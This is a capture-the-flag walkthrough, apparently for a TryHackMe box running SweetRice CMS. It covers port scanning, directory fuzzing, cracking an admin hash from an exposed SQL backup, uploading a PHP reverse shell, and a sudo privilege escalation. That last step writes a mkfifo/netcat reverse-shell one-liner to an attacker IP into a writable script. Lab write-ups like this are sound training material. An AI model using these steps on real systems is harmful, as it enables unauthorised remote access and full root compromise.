initial Network Enumeration
```shell
nmap -sS 10.10.126.245
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-29 22:03 IST
Nmap scan report for 10.10.126.245
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 23.60 seconds
```

only 2 ports active
- ssh
- http

now as we dont have anything to do we can do a directory bursting on the http for any usefull endpoint as the default page is on / 
using ffuf now
```shell
ffuf -u http://10.10.126.245/FUZZ -w /usr/share/wordlists/dirb/big.txt
```
we got some of the endpoints
/content
got the main page but nothing much
lets ffuf it again for further directories
```shell
ffuf -u http://10.10.126.245/content/FUZZ -w /usr/share/wordlists/dirb/big.txt
```
got some more endpoints
- /as
- /attachment
- /inc
lets analyze each one of it
/as has a login page of sweet rice CMS
/inc has the page files like 404.php and others, but there is one special file it may contain the sql db or something so we saw that and after converting it to readable format
 we got the admin username is "manager"
 we also got a paswor but it is hashed, we can use hashcat or online tool like crackstation to crack it easily
 i have used hashcat 
 ```shell
 hashcat --show password
```
```shell
hashcat -m 0 password /usr/share/wordlists/rockyou.txt
```
and boom we got the password for the CMS
```shell
42f749ade7f9e195bf475f37a44cafcb:Password123
```
and now we can use these creds to sign in into the CMS
now as we have username and password, i searched for an exploit of "Arbitary File Upload"
but unfortunatly it did'nt work, the file was being uploaded but not accesible
analyzed the CMS for any other file upload input and got one at Database import
as the /inc endpoint was present and there we had the sql backup present i thought the uploaded file can be accessed there
uploaded the gold rev shell by pentest monkey and it was uploaded successfully
started a nc listener
```shell
nc -nvlp 1234
```
now as we see the sql backup folder there we got the rev shell file
clicked it and the shell was executed
an we got in as user and also got the user.txt
```shell
sudo -l
```
this shows us that what the user can do without password
```shell
User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```
we can use the backup.pl file as it runs a copy.sh script which is present in /etc/copy.sh and we have access to it
we can use it to execute the command we need
```shell
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.12.148 4445 >/tmp/f" > copy.sh
```
also we need to turn on one more nc listener on port 4445
now we can execute the backup.pl so the script gets executed and we get a privilaged shell at netcat listener
```shell
sudo /usr/bin/perl /home/itguy/backup.pl
```
boom we got root shell in our listener and we also got the root.txt
we have successfully completed the CTF 
